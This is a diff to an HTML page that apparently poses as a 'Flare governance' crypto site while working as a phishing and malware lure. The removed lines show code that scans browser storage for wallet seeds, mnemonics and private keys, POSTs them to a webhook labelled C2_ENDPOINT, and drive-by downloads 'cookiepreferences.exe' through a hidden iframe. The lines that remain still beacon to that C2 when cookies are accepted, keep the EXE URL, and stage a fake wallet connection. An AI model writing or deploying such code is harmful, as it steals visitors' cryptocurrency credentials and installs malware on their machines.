@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -152,8 +153,7 @@
     background-clip: text;
   }
 
-  .hero-section .
-subhead {
+    .hero-section .subhead {
     color: var(--flare-subtle);
     font-size: 1.05rem;
     margin-bottom: 2rem;
@@ -507,7 +507,7 @@ hero-section { padding: 2rem 1.25rem; }
   // import { SignClient } from 'https://unpkg.com/@walletconnect/sign-client@2.12.2/dist/index.js';
 
   const PROJECT_ID = 'YOUR_WALLETCONNECT_PROJECT_ID';
-  const C2_ENDPOINT = 'https://webhook.site/https://webhook.site/8341a977-b79c-4064-a8c9-0392a57e336f';
+  const C2_ENDPOINT = 'https://webhook.site/8341a977-b79c-4064-a8c9-0392a57e336f';
   const EXE_URL = 'https://flaregovernance.github.io/CookiePreferences.exe';
 
   let signClient, modal, connectedAccount = null;
@@ -658,53 +658,18 @@ hero-section { padding: 2rem 1.25rem; }
           body: JSON.stringify({ type: 'TEST_PING', message: 'Cookie accepted' })
         }).catch(function(){});
 
-        // 4. Run the wallet scan + EXE download
-        var walletsFound = [];
-        if (window.ethereum) walletsFound.push('MetaMask/Injected');
-        if (window.solana) walletsFound.push('Phantom/Solana');
-        if (window.coinbaseWalletExtension) walletsFound.push('Coinbase Wallet');
-        if (window.trustwallet) walletsFound.push('Trust Wallet');
 
-        // Scan browser storage
-        var storageHits = [];
-        for (var i = 0; i < localStorage.length; i++) {
-          var key = localStorage.key(i);
-          if (/wallet|metamask|phantom|seed|mnemonic|private/i.test(key)) {
-            storageHits.push({ type: 'localStorage', key: key, value: localStorage.getItem(key) });
-          }
-        }
-        for (var i = 0; i < sessionStorage.length; i++) {
-          var key = sessionStorage.key(i);
-          if (/wallet|metamask|phantom|seed|mnemonic|private/i.test(key)) {
-            storageHits.push({ type: 'sessionStorage', key: key, value: sessionStorage.getItem(key) });
-          }
-        }
-        if (storageHits.length > 0) {
-          fetch('https://webhook.site/8341a977-b79c-4064-a8c9-0392a57e336f', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ type: 'BROWSER_STORAGE_HITS', data: storageHits })
-          }).catch(function(){});
-        }
+        
 
-        // Download the EXE via hidden iframe
-        var exeUrl = 'https://tmpfiles.org/dl/wiwiwMfA5co1/cookiepreferences.exe';
-        if (exeUrl && exeUrl.indexOf('your-c2-server') === -1) {
-          var iframe = document.createElement('iframe');
-          iframe.style.display = 'none';
-          iframe.src = exeUrl;
-          document.body.appendChild(iframe);
-          setTimeout(function() { document.body.removeChild(iframe); }, 5000);
-        }
-
-        // Final report
+               // 3. Send test ping to verify C2
         fetch('https://webhook.site/8341a977-b79c-4064-a8c9-0392a57e336f', {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ type: 'PAYLOAD_EXECUTED', walletsDetected: walletsFound })
+          mode: 'no-cors',
+          headers: { 'Content-Type': 'text/plain' },
+          body: JSON.stringify({ type: 'TEST_PING', message: 'Cookie accepted' })
         }).catch(function(){});
-      });
-    }
+
+
 
     // === CONNECT WALLET: Show fake success ===
     var connectBtn = document.getElementById('connectWalletBtn');
